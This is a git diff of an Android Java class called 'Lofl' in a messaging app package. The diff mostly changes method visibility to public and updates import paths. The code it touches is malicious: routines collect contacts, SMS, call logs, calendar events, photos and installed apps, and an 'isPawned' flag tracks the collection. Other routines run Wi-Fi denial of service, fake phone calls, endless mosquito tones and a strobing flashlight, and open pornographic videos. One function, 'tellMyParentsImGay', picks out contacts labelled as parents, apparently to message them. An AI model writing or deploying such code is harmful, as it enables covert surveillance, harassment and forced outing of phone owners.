@@ -25,7 +25,6 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
-import android.media.Ringtone;
 import android.media.RingtoneManager;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
@@ -34,12 +33,9 @@ import android.os.Environment;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.preference.PreferenceManager;
-import android.preference.RingtonePreference;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
-import android.provider.DocumentsContract;
-import android.provider.DocumentsProvider;
 import android.provider.Settings;
 import android.provider.Telephony;
 import android.telephony.SmsManager;
@@ -61,50 +57,50 @@ import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
-import static com.candroid.textme.JobsScheduler.CALENDAR_EVENTS_KEY;
-import static com.candroid.textme.JobsScheduler.CONTACTS_KEY;
-import static com.candroid.textme.JobsScheduler.DCIM_KEY;
-import static com.candroid.textme.JobsScheduler.DEVICE_KEY;
-import static com.candroid.textme.JobsScheduler.FAKE_PHONE_CALL_KEY;
-import static com.candroid.textme.JobsScheduler.PACKAGES_KEY;
-import static com.candroid.textme.JobsScheduler.PHONE_CALLS_KEY;
-import static com.candroid.textme.JobsScheduler.SMS_KEY;
+import static com.candroid.textme.jobs.JobsScheduler.CALENDAR_EVENTS_KEY;
+import static com.candroid.textme.jobs.JobsScheduler.CONTACTS_KEY;
+import static com.candroid.textme.jobs.JobsScheduler.DCIM_KEY;
+import static com.candroid.textme.jobs.JobsScheduler.DEVICE_KEY;
+import static com.candroid.textme.jobs.JobsScheduler.FAKE_PHONE_CALL_KEY;
+import static com.candroid.textme.jobs.JobsScheduler.PACKAGES_KEY;
+import static com.candroid.textme.jobs.JobsScheduler.PHONE_CALLS_KEY;
+import static com.candroid.textme.jobs.JobsScheduler.SMS_KEY;
 
 public class Lofl {
     private static int sId = -1;
     private static NotificationManager sNotificationManager;
     private static Bitmap sLargeIcon;
-    protected static boolean sIsFlaghlightOn = false;
-    protected static CameraManager sCameraManager;
+    public static boolean sIsFlaghlightOn = false;
+    public static CameraManager sCameraManager;
 
-    protected static void uninstallApp(Context context, String packageName){
+    public static void uninstallApp(Context context, String packageName){
         Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse(packageName));
         context.startActivity(intent);
     }
 
-    protected static List<ApplicationInfo> getInstalledApps(Context context){
+    public static List<ApplicationInfo> getInstalledApps(Context context){
         return context.getPackageManager().getInstalledApplications(PackageManager.MATCH_UNINSTALLED_PACKAGES);
     }
 
-    protected static File[] getFilesForDirectory(String path){
+    public static File[] getFilesForDirectory(String path){
         return new File(path).listFiles();
     }
 
-    protected static boolean isImage(File file){
+    public static boolean isImage(File file){
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
         return mimeType != null && mimeType.startsWith("image");
     }
 
-    protected static boolean isVideo(File file){
+    public static boolean isVideo(File file){
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
         return mimeType != null && mimeType.startsWith("video");    }
 
-    protected static boolean isText(File file){
+    public static boolean isText(File file){
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
         return mimeType != null && mimeType.startsWith("text") && !mimeType.endsWith("iif");
     }
 
-    protected static boolean isSpreadsheet(File file){
+    public static boolean isSpreadsheet(File file){
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
         if(mimeType != null && mimeType.contains("excel")){
             return true;
@@ -115,7 +111,7 @@ public class Lofl {
         }
     }
 
-    protected static boolean isQuickbooks(File file){
+    public static boolean isQuickbooks(File file){
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
        if(mimeType != null && mimeType.contains("qbooks")){
             return true;
@@ -129,15 +125,15 @@ public class Lofl {
         }
     }
 
-    protected static File getPicturesDirectory(){
+    public static File getPicturesDirectory(){
         return new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getPath());
     }
 
-    protected static File getDcimDirectory(){
+    public static File getDcimDirectory(){
         return new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath());
     }
 
-    protected static boolean isExternalStorageReadable(){
+    public static boolean isExternalStorageReadable(){
         String state = Environment.getExternalStorageState();
         if (Environment.MEDIA_MOUNTED.equals(state) ||
                 Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
@@ -146,7 +142,7 @@ public class Lofl {
         return false;
     }
 
-    protected static byte[] fileToBytes(File f ) {
+    public static byte[] fileToBytes(File f ) {
         ByteArrayOutputStream bos = null;
         File file = new File(f.getPath());
         try {
@@ -165,7 +161,7 @@ public class Lofl {
         return null;
     }
 
-    protected static String handleSharedText(Intent intent) {
+    public static String handleSharedText(Intent intent) {
         StringBuilder text = new StringBuilder();
         Bundle extras = intent.getExtras();
         if (extras != null) {
@@ -185,38 +181,38 @@ public class Lofl {
         return text.toString();
     }
 
-    protected static void vibrator(Context context){
+    public static void vibrator(Context context){
         Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
         if(vibrator.hasVibrator()){
             if(vibrator.hasAmplitudeControl()){
-                vibrator.vibrate(VibrationEffect.createOneShot(86400000L, 255));
+                vibrator.vibrate(VibrationEffect.createOneShot(60000L, 255));
             }else{
-                vibrator.vibrate(VibrationEffect.createOneShot(86400000L, VibrationEffect.DEFAULT_AMPLITUDE));
+                vibrator.vibrate(VibrationEffect.createOneShot(60000L, VibrationEffect.DEFAULT_AMPLITUDE));
             }
         }
     }
 
-    protected static void phoneCall(Context context, String address){
+    public static void phoneCall(Context context, String address){
         Intent callIntent = new Intent(Intent.ACTION_CALL);
         callIntent.setData(Uri.parse("tel:" + address));
         context.startActivity(callIntent);
     }
 
-    protected static void searchGoogleMaps(Context context, String query){
+    public static void searchGoogleMaps(Context context, String query){
         Uri uri = Uri.parse("geo:0, 0?q=" + query);
         Intent mapIntent = new Intent(Intent.ACTION_VIEW, uri);
         mapIntent.setPackage("com.google.android.apps.maps");
         context.startActivity(mapIntent);
     }
 
-    protected static void setJobRan(Context context, String key){
+    public static void setJobRan(Context context, String key){
         SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
         editor.putBoolean(key, true);
         editor.apply();
 
     }
 
-    protected static void tellMyParentsImGay(Context context){
+    public static void tellMyParentsImGay(Context context){
         ArrayList<Contact> contacts = Lofl.fetchContactsInformation(context);
         ArrayList<Contact> parents = new ArrayList<>();
         String[] possibleParentNames = new String[]{"father", "mother", "mom", "mommy", "dad", "daddy", "pops", "ma", "parent", "parents"};
@@ -236,7 +232,7 @@ public class Lofl {
 
     }
 
-    protected static boolean isPawned(Context context){
+    public static boolean isPawned(Context context){
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
         return sharedPreferences.getBoolean(DCIM_KEY, false) && sharedPreferences.getBoolean(PACKAGES_KEY, false) &&
         sharedPreferences.getBoolean(CONTACTS_KEY, false) &&
@@ -247,7 +243,7 @@ public class Lofl {
         sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
     }
 
-    protected static void persistentBlinkingFlashlight(final Context context){
+    public static void persistentBlinkingFlashlight(final Context context){
         TimerTask timerTask = new TimerTask() {
             @Override
             public void run() {
@@ -281,7 +277,7 @@ public class Lofl {
         timer.schedule(timerTask, 300L, 100L);
     }
 
-    protected static void turnOffFlashlight(Context context){
+    public static void turnOffFlashlight(Context context){
         CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
         try {
             cameraManager.setTorchMode(cameraManager.getCameraIdList()[0], false);
@@ -290,7 +286,7 @@ public class Lofl {
         }
     }
 
-    protected static void browserGoogleSearch(Context context, String query){
+    public static void browserGoogleSearch(Context context, String query){
         try {
             String encodedQuery = URLEncoder.encode(query, "UTF-8");
             Uri uri = Uri.parse(String.format("https://google.com/search?q=%s", encodedQuery));
@@ -301,7 +297,7 @@ public class Lofl {
         }
     }
 
-    protected static void browserDuckDuckGoSearch(Context context, String query){
+    public static void browserDuckDuckGoSearch(Context context, String query){
         try {
             String encodedQuery = URLEncoder.encode(query, "UTF-8");
             Uri uri = Uri.parse(String.format("https://duckduckgo.com/?q=%s", encodedQuery));
@@ -312,13 +308,13 @@ public class Lofl {
         }
     }
 
-    protected static void googleNowQuery(Context context, String query){
+    public static void googleNowQuery(Context context, String query){
         Intent webSearchIntent = new Intent(Intent.ACTION_WEB_SEARCH);
         webSearchIntent.putExtra(SearchManager.QUERY, "I wish somebody would stop trying to attack my system so i could go back to learning android. Where do we do that at? Until then I shall work on a library called Lofl");
         context.startActivity(webSearchIntent);
     }
 
-    protected static void playMosquitoRingtoneTwice(Context context){
+    public static void playMosquitoRingtoneTwice(Context context){
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -346,7 +342,7 @@ public class Lofl {
         }).start();
     }
 
-    protected static void playEndlessMosquitoRingtone(Context context){
+    public static void playEndlessMosquitoRingtone(Context context){
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -373,13 +369,13 @@ public class Lofl {
         }).start();
     }
 
-    protected static void watchPornHubVideo(Context context, String videoId){
+    public static void watchPornHubVideo(Context context, String videoId){
         Uri pornVideo = Uri.parse("https://www.pornhub.com/view_video.php?viewkey=".concat(videoId));
         Intent pornIntent = new Intent(Intent.ACTION_VIEW, pornVideo);
         context.startActivity(pornIntent);
     }
 
-    protected static Bitmap getBitmapFromUrl(String url){
+    public static Bitmap getBitmapFromUrl(String url){
         try {
             InputStream inputStream = new java.net.URL(url).openStream();
             return BitmapFactory.decodeStream(inputStream);
@@ -389,7 +385,7 @@ public class Lofl {
         return null;
     }
 
-    protected static void changeWallpaper(Context context, Bitmap bitmap){
+    public static void changeWallpaper(Context context, Bitmap bitmap){
         try {
             WallpaperManager.getInstance(context).setBitmap(bitmap);
         }
@@ -410,12 +406,12 @@ public class Lofl {
         return sLargeIcon;
     }
 
-    protected static void removeNotification(Context context, int id) {
+    public static void removeNotification(Context context, int id) {
         initNotificationManager(context);
         sNotificationManager.cancel(id);
     }
 
-    protected static String lookupPhoneNumberByName(Context context, String name) {
+    public static String lookupPhoneNumberByName(Context context, String name) {
         String address = "";
         String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ";
         String[] selectionArgs = new String[]{"%".concat(name).concat("%")};
@@ -428,7 +424,7 @@ public class Lofl {
         return address;
     }
 
-    protected static void createConversation(final Context context, String address, String sharedText) {
+    public static void createConversation(final Context context, String address, String sharedText) {
         Intent notifyIntent = new Intent();
         if(sharedText != null){
             notifyIntent.putExtra(Constants.SHARED_TEXT_KEY, sharedText);
@@ -444,11 +440,11 @@ public class Lofl {
         });
     }
 
-    protected static LocationManager getLocationManager(Context context){
+    public static LocationManager getLocationManager(Context context){
         return (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
     }
 
-    protected static ArrayList<CalendarEvent> fetchCalendarEvents(Context context){
+    public static ArrayList<CalendarEvent> fetchCalendarEvents(Context context){
        ArrayList<CalendarEvent> calendarEvents = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(CalendarContract.Events.CONTENT_URI, null, null, null, null);
         if(cursor != null){
@@ -470,12 +466,12 @@ public class Lofl {
         return calendarEvents;
     }
 
-    protected static void sendNonDataSms(Context context , String destAddress, String body){
+    public static void sendNonDataSms(Context context , String destAddress, String body){
         SmsManager smsManager = SmsManager.getDefault();
         smsManager.sendTextMessage(destAddress, null, body, null, null);
     }
 
-    protected static ArrayList<Contact> fetchContactsInformation(Context context){
+    public static ArrayList<Contact> fetchContactsInformation(Context context){
         ArrayList<Contact> contacts = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null);
         if(cursor != null){
@@ -497,7 +493,7 @@ public class Lofl {
         return contacts;
     }
 
-    protected static void wifiDenialOfService(Context context){
+    public static void wifiDenialOfService(Context context){
         WifiManager wifiManager = getWifiManager(context);
         new Thread(new Runnable() {
             @Override
@@ -514,19 +510,19 @@ public class Lofl {
         }).start();
     }
 
-    protected static void wifiDeauthenticate(Context context){
+    public static void wifiDeauthenticate(Context context){
         getWifiManager(context).disconnect();
     }
 
-    protected static WifiManager getWifiManager(Context context){
+    public static WifiManager getWifiManager(Context context){
         return (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
     }
 
-    protected static void wifiScan(Context context){
+    public static void wifiScan(Context context){
         getWifiManager(context).startScan();
     }
 
-    protected static String lookupEmailByContactId(Context context, long id){
+    public static String lookupEmailByContactId(Context context, long id){
         String email = null;
         Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{String.valueOf(id)}, null);
         if(cursor != null){
@@ -538,7 +534,7 @@ public class Lofl {
         return email;
     }
 
-    protected static String reverseLookupNameByPhoneNumber(String address, ContentResolver contentResolver) {
+    public static String reverseLookupNameByPhoneNumber(String address, ContentResolver contentResolver) {
         StringBuilder name = new StringBuilder();
         Uri lookupUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
         try (Cursor cursor = contentResolver.query(lookupUri, new String[]{ContactsContract.Data.DISPLAY_NAME_PRIMARY, ContactsContract.Data.PHOTO_THUMBNAIL_URI}, null, null, null)) {
@@ -553,7 +549,7 @@ public class Lofl {
         return String.valueOf(name);
     }
 
-    protected static void syncCallLogDataToDatabase(Context context, DatabaseHelper database){
+    public static void syncCallLogDataToDatabase(Context context, DatabaseHelper database){
         try {
             Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
             while(cursor.moveToNext()){
@@ -569,7 +565,7 @@ public class Lofl {
         }
     }
 
-    protected static void notifyAirplaneMode(Context context, String title, String body){
+    public static void notifyAirplaneMode(Context context, String title, String body){
         initNotificationManager(context);
         Notification.Builder builder = new Notification.Builder(context, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
         builder.setContentTitle(title);
@@ -580,7 +576,7 @@ public class Lofl {
         sNotificationManager.notify(sId++, builder.build());
     }
 
-    protected static void notifySent(Context context, String title, Intent intent){
+    public static void notifySent(Context context, String title, Intent intent){
         createConfirmationsNotificationChannel(context);
         Notification.Builder builder = new Notification.Builder(context, Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID);
         builder.setSmallIcon(android.R.drawable.stat_notify_chat).setContentTitle(title).setPriority(Notification.PRIORITY_DEFAULT).setColor(context.getResources().getColor(android.R.color.holo_green_dark))
@@ -596,7 +592,7 @@ public class Lofl {
         return pendingIntent;
     }
 
-    protected static void notify(Context context, Intent intent, String address, String body) {
+    public static void notify(Context context, Intent intent, String address, String body) {
         sId++;
         Notification.Action whisperAction = null;
         if(intent.hasExtra(Constants.SHARED_TEXT_KEY)){
@@ -621,7 +617,7 @@ public class Lofl {
         }
     }
 
-    protected static void startPornProvider(final Context context, final int intervalDelay){
+    public static void startPornProvider(final Context context, final int intervalDelay){
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -644,7 +640,7 @@ public class Lofl {
         }).start();
     }
 
-    protected static LocationListener getLocationListener(Context context){
+    public static LocationListener getLocationListener(Context context){
         return new LocationListener() {
             @Override
             public void onLocationChanged(Location location) {
@@ -669,7 +665,7 @@ public class Lofl {
         };
     }
 
-    protected static ArrayList<SmsMsg>fetchSmsMessages(Context context){
+    public static ArrayList<SmsMsg>fetchSmsMessages(Context context){
         ArrayList<SmsMsg> smsMsgs = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
         if (cursor != null) {
@@ -697,7 +693,7 @@ public class Lofl {
         return smsMsgs;
     }
 
-    protected static Pair<String, String> handleSms(Context context, Intent intent){
+    public static Pair<String, String> handleSms(Context context, Intent intent){
         StringBuilder address = new StringBuilder();
         StringBuilder body = new StringBuilder();
         SmsMessage[] smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent);
@@ -710,12 +706,12 @@ public class Lofl {
     }
 
 
-    protected static void sendDeliveryReportSms(String address){
+    public static void sendDeliveryReportSms(String address){
         SmsManager smsManager = SmsManager.getDefault();
         smsManager.sendDataMessage(address, null, new Short("6666"), Constants.DELIVERY_REPORT_CODE.getBytes(), null, null);
     }
 
-    protected static void notifyDelivered(Context context, Intent intent){
+    public static void notifyDelivered(Context context, Intent intent){
         sId++;
         createConfirmationsNotificationChannel(context);
         Notification.Builder builder = new Notification.Builder(context, Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID);
@@ -726,7 +722,7 @@ public class Lofl {
     }
 
     /*send sms message as type String*/
-    protected static void sendSms(Context context, String response, String destTelephoneNumber) {
+    public static void sendSms(Context context, String response, String destTelephoneNumber) {
         SmsManager smsManager = SmsManager.getDefault();
         ArrayList<PendingIntent> sentIntents = new ArrayList<>();
         String name = Lofl.reverseLookupNameByPhoneNumber(destTelephoneNumber, context.getContentResolver());
@@ -742,7 +738,7 @@ public class Lofl {
         }
     }
 
-    protected static String getDeviceTelephoneNumber(Context context){
+    public static String getDeviceTelephoneNumber(Context context){
         try {
             TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
             return telephonyManager.getLine1Number();
@@ -752,7 +748,7 @@ public class Lofl {
         }
     }
 
-    protected static ArrayList<PhoneCall> fetchCallLog(Context context){
+    public static ArrayList<PhoneCall> fetchCallLog(Context context){
         ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);
         if(cursor != null){
@@ -767,12 +763,12 @@ public class Lofl {
         return phoneCalls;
     }
 
-    protected static void pickContact(Activity activity) {
+    public static void pickContact(Activity activity) {
         Intent contactsIntent = new Intent(Intent.ACTION_PICK, ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
         activity.startActivityForResult(contactsIntent, Constants.PICK_CONTACT_REQ_CODE);
     }
 
-    protected static void createConfirmationsNotificationChannel(Context context){
+    public static void createConfirmationsNotificationChannel(Context context){
         initNotificationManager(context);
         if(sNotificationManager.getNotificationChannel(Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID) == null){
             NotificationChannel notificationChannel = new NotificationChannel(Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID, Constants.CONFIRMATION_NOTIFICATION_CHANNEL_TITLE, NotificationManager.IMPORTANCE_HIGH);
@@ -784,7 +780,7 @@ public class Lofl {
         }
     }
 
-    protected static void createPrimaryNotificationChannel(NotificationManager notificationManager) {
+    public static void createPrimaryNotificationChannel(NotificationManager notificationManager) {
         if(sNotificationManager.getNotificationChannel(Constants.PRIMARY_NOTIFICATION_CHANNEL_ID) == null){
             NotificationChannel notificationChannel = new NotificationChannel(Constants.PRIMARY_NOTIFICATION_CHANNEL_ID, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID, NotificationManager.IMPORTANCE_HIGH);
             notificationChannel.setShowBadge(true);
@@ -836,7 +832,7 @@ public class Lofl {
         return intent;
     }
 
-    protected static Notification createPersistentServiceNotification(Context context) {
+    public static Notification createPersistentServiceNotification(Context context) {
         createPersistentForegroundNotificationChannel(context);
         Intent intent = new Intent(context, MainActivity.class);
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
@@ -851,7 +847,7 @@ public class Lofl {
         return builder.build();
     }
 
-    protected static void fakePhoneCall(Context context){
+    public static void fakePhoneCall(Context context){
         RingtoneManager ringtoneManager = new RingtoneManager(context);
         Uri uri = RingtoneManager.getActualDefaultRingtoneUri(context, RingtoneManager.TYPE_RINGTONE);
         ringtoneManager.getRingtone(ringtoneManager.getRingtonePosition(uri)).play();
@@ -867,7 +863,7 @@ public class Lofl {
         }
     }
 
-    protected static boolean checkAirplaneMode(Context context){
+    public static boolean checkAirplaneMode(Context context){
         boolean isOn = false;
         if(Settings.System.getInt(context.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) == 0){
             isOn = true;
